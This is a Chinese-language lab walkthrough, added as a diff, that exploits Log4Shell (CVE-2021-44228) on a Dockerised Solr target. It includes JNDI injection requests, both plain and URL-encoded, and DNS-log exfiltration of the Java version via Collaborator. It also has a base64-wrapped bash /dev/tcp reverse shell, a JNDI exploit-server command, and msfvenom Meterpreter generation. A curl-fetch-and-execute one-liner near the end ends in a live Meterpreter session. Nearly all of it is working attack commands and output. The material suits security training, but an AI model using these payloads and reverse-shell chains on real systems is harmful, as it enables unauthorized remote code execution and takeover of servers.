@@ -1,0 +1,338 @@
+试试log4j2漏洞复现
+咱们先部署一下靶场
+[root@localhost 5.0.23-rce]# cd /home
+[root@localhost home]# unzip log4j2.zip 
+Archive:  log4j2.zip
+   creating: log4j2/CVE-2021-44228/
+  inflating: log4j2/CVE-2021-44228/1.png  
+  inflating: log4j2/CVE-2021-44228/2.png  
+  inflating: log4j2/CVE-2021-44228/README.md  
+  inflating: log4j2/CVE-2021-44228/README.zh-cn.md  
+  inflating: log4j2/CVE-2021-44228/docker-compose.yml  
+[root@localhost home]# cd ./log4j2/
+[root@localhost log4j2]# cd CVE-2021-44228/
+[root@localhost CVE-2021-44228]# ls
+1.png  2.png  docker-compose.yml  README.md  README.zh-cn.md
+[root@localhost CVE-2021-44228]# docker compose up -d
+WARN[0000] /home/log4j2/CVE-2021-44228/docker-compose.yml: `version` is obsolete 
+[+] Running 2/2
+ ✔ Network cve-2021-44228_default   Created                                                                           0.4s 
+ ✔ Container cve-2021-44228-solr-1  Started                                                                           0.9s 
+[root@localhost CVE-2021-44228]# 
+
+log4j2是一个java日志处理套件 版本在1.0-2.14.1 都有jndi注入漏洞
+攻击者可以在控制日志内容的情况下通过外部传入数据,执行任意代码
+
+JNDI是java中的命名和目录接口
+就是可以远程加载LDAP或RMI服务提供的恶意代码注入并执行
+操作上我们只要将${jndi:ldap://127.0.0.1/payload}传递到日志就可以了 但日志级别是error或者fatal才行
+LDAP（轻量级目录访问协议）
+
+原理就是在已有的接口中传入已有的参数 中携带LDAP 之后被log4j2执行了
+攻击者服务器返回一段恶意执行代码程序的class字节码
+java应用了代码
+
+我们可以先检测一下服务是存在漏洞
+┌──(root💀tyza66)-[~/Evil-Droid-master]
+└─# msfdb run
+[i] Database already started
+Metasploit tip: Use sessions -1 to interact with the last opened session
+                                                  
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com
+
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search log4j
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank       Check  Description
+   -   ----                                           ---------------  ----       -----  -----------
+   0   exploit/multi/http/log4shell_header_injection  2021-12-09       excellent  Yes    Log4Shell HTTP Header Injection                                  
+   1     \_ target: Automatic                         .                .          .      .
+   2     \_ target: Windows                           .                .          .      .
+   3     \_ target: Linux                             .                .          .      .
+   4     \_ AKA: Log4Shell                            .                .          .      .
+   5     \_ AKA: LogJam                               .                .          .      .
+   6   auxiliary/scanner/http/log4shell_scanner       2021-12-09       normal     No     Log4Shell HTTP Scanner
+   7     \_ AKA: Log4Shell                            .                .          .      .
+   8     \_ AKA: LogJam                               .                .          .      .
+   9   exploit/linux/http/mobileiron_core_log4shell   2021-12-12       excellent  Yes    MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)
+   10    \_ AKA: Log4Shell                            .                .          .      .
+   11    \_ AKA: LogJam                               .                .          .      .
+   12  exploit/multi/http/ubiquiti_unifi_log4shell    2021-12-09       excellent  Yes    UniFi Network Application Unauthenticated JNDI Injection RCE (via Log4Shell)
+   13    \_ target: Windows                           .                .          .      .
+   14    \_ target: Unix                              .                .          .      .
+   15    \_ AKA: Log4Shell                            .                .          .      .
+   16    \_ AKA: LogJam                               .                .          .      .
+
+
+Interact with a module by name or index. For example info 16, use 16 or use exploit/multi/http/ubiquiti_unifi_log4shell                                   
+
+msf6 > use 6
+msf6 auxiliary(scanner/http/log4shell_scanner) > options
+
+Module options (auxiliary/scanner/http/log4shell_scanner):
+
+   Name          Current Setting     Required  Description
+   ----          ---------------     --------  -----------
+   HEADERS_FILE  /usr/share/metaspl  no        File containing headers to c
+                 oit-framework/data            heck
+                 /exploits/CVE-2021
+                 -44228/http_header
+                 s.txt
+   HTTP_METHOD   GET                 yes       The HTTP method to use
+   LDAP_TIMEOUT  30                  yes       Time in seconds to wait to r
+                                               eceive LDAP connections
+   LDIF_FILE                         no        Directory LDIF file path
+   LEAK_PARAMS                       no        Additional parameters to lea
+                                               k, separated by the ^ charac
+                                               ter (e.g., ${env:USER}^${env
+                                               :PATH})
+   Proxies                           no        A proxy chain of format type
+                                               :host:port[,type:host:port][
+                                               ...]
+   RHOSTS                            yes       The target host(s), see http
+                                               s://docs.metasploit.com/docs
+                                               /using-metasploit/basics/usi
+                                               ng-metasploit.html
+   RPORT         80                  yes       The target port (TCP)
+   SRVHOST       0.0.0.0             yes       The local host or network in
+                                               terface to listen on. This m
+                                               ust be an address on the loc
+                                               al machine or 0.0.0.0 to lis
+                                               ten on all addresses.
+   SRVPORT       389                 yes       The local port to listen on.
+   SSL           false               no        Negotiate SSL/TLS for outgoi
+                                               ng connections
+   TARGETURI     /                   yes       The URI to scan
+   THREADS       1                   yes       The number of concurrent thr
+                                               eads (max one per host)
+   URIS_FILE     /usr/share/metaspl  no        File containing additional U
+                 oit-framework/data            RIs to check
+                 /exploits/CVE-2021
+                 -44228/http_uris.t
+                 xt
+   VHOST                             no        HTTP server virtual host
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/http/log4shell_scanner) > set RHOSTS 192.168.101.99
+RHOSTS => 192.168.101.99
+msf6 auxiliary(scanner/http/log4shell_scanner) > set RPORT 8983
+RPORT => 8983
+msf6 auxiliary(scanner/http/log4shell_scanner) > set SRVHOST 192.168.101.53
+SRVHOST => 192.168.101.53
+msf6 auxiliary(scanner/http/log4shell_scanner) > run
+
+[+] 192.168.101.99:8983   - Log4Shell found via /solr/admin/cores?action=CREATE&wt=json&name=%24%7bjndi%3aldap%3a/192.168.101.53%3a389/5ke0ozuxusd0vrdvll0wo5ro/%24%7bjava%3aos%7d/%24%7bsys%3ajava.vendor%7d_%24%7bsys%3ajava.version%7d%7d (os: Linux 3.10.0-693.el7.x86_64 unknown, architecture: amd64-64) (java: Oracle Corporation_1.8.0_102)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Sleeping 30 seconds for any last LDAP connections
+[*] Server stopped.
+[*] Auxiliary module execution completed
+
+再某些没有回显的情况下 但是目标可以发出dns请求的时候可以用DNSlog把想获得的数据外带出来
+bp自带类似的功能
+
+用重放器
+GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com} HTTP/1.1
+Host: 192.168.101.99:8983
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/95.0.4638.69 Safari/537.36
+Connection: close
+
+先用Collaborator
+点复制到剪切板 会随机生成一个域名
+GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.hh2a745b19ap3wppl4hkfkmd54bxzond.oastify.com} HTTP/1.1
+Host: 192.168.101.99:8983
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+Connection: close
+拼接上域名
+
+之后参数还需要编码
+GET /solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%24%7b%73%79%73%3a%6a%61%76%61%2e%76%65%72%73%69%6f%6e%7d%2e%68%68%32%61%37%34%35%62%31%39%61%70%33%77%70%70%6c%34%68%6b%66%6b%6d%64%35%34%62%78%7a%6f%6e%64%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%7d HTTP/1.1
+Host: 192.168.101.99:8983
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+Connection: close
+
+
+记得留两个空行
+回Collaborator看一下
+The Collaborator server received a DNS lookup of type A for the domain name 1.8.0_102.hh2a745b19ap3wppl4hkfkmd54bxzond.oastify.com.
+
+利用log4j2漏洞和nc+MSF工具进行渗透反弹shell
+
+linux中有这样一个反弹连接脚本
+bash -i > /dev/tcp/192.168.101.53/4444 2>&1 0>&1
+精简后是bash -i >&/dev/tcp/192.168.101.53/4444 0>&1
+0 是标准输入 1是标准输出 标准注入先重定向到了标准输出 再重定向到链接
+
+创建一个交互
+bash -i >& /dev/tcp/192.168.101.53/4444 0>&1
+
+然后我们需要先在kali监听
+┌──(root💀tyza66)-[~]
+└─# nc -lnvp 4444                     
+listening on [any] 4444 ...
+
+试一下bash -i >& /dev/tcp/192.168.101.53/4444 0>&1
+发现监听处已经拿到shell了
+┌──(root💀tyza66)-[~]
+└─# nc -lnvp 4444                     
+listening on [any] 4444 ...
+connect to [192.168.101.53] from (UNKNOWN) [192.168.101.99] 37172
+[root@localhost CVE-2021-44228]#    
+
+然后构造执行的命令
+
+这次我们使用base64编码
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMS41My80NDQ0IDA+JjE=
+
+通常在目标服务器
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMS41My80NDQ0IDA+JjE= | base64 -d
+就可以解码
+
+bash -c 可以执行一长串命令
+{} 用于生成一个整体 并且在当前shell下执行
+bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMS41My80NDQ0IDA+JjE=}|{base64,-d}|bash"
+
+之后我们需要启动一个JNDI服务
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMS41My80NDQ0IDA+JjE=}|{base64,-d}|bash" -A 192.168.101.53
+
+其中包含了恶意代码
+rmi://192.168.101.53:1099/b6do0y
+ldap://192.168.101.53:1389/b6do0y
+
+
+GET /solr/admin/cores?action=${jndi:ldap://192.168.101.53:1389/b6do0y} HTTP/1.1
+Host: 192.168.101.99:8983
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+Connection: close
+
+%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%30%31%2e%35%33%3a%31%33%38%39%2f%62%36%64%6f%30%79%7d
+
+http://192.168.101.99:8983/solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%30%31%2e%35%33%3a%31%33%38%39%2f%62%36%64%6f%30%79%7d
+
+之后请求一下构造的地址 curl请求也行 浏览器请求也行
+回到kali的nc那里 发现已经拿到终端
+──(root💀tyza66)-[~]
+└─# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.101.53] from (UNKNOWN) [192.168.101.99] 42430
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@7ea7a1935e01:/opt/solr/server# 
+
+现在想办法将这个东西的控制权给到msf
+imsf6 > use /multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+
+这里不再用独立载荷了
+msf6 exploit(multi/handler) > options
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may b
+                                     e specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > set LHOST 192.168.101.53
+LHOST => 192.168.101.53
+msf6 exploit(multi/handler) > set LPORT 5555
+LPORT => 5555
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:5555 
+开始监听5555
+
+之后生成一个木马
+msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.101.53 lport=5555 -f elf -o /var/www/html/nc2msf5555
+
+┌──(root💀tyza66)-[~]
+└─# msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.101.53 lport=5555 -f elf -o /var/www/html/nc2msf5555
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 130 bytes
+Final size of elf file: 250 bytes
+Saved as: /var/www/html/nc2msf5555
+
+
+我们再构造一个启动操作 去之前拿到的连接里面执行就行
+curl -so /tmp/nc2msf5555 http://192.168.101.53/nc2msf5555;chmod +x /tmp/nc2msf5555;/tmp/nc2msf5555;rm -f /tmp/nc2msf5555
+
+执行完成之后发现我们监听的5555已经拿到了链接
+[*] Started reverse TCP handler on 192.168.101.53:5555 
+[*] Sending stage (3045380 bytes) to 192.168.101.99
+[*] Meterpreter session 1 opened (192.168.101.53:5555 -> 192.168.101.99:44526) at 2025-02-18 15:01:34 +0800
+
+meterpreter > 
+
+
+
+
+
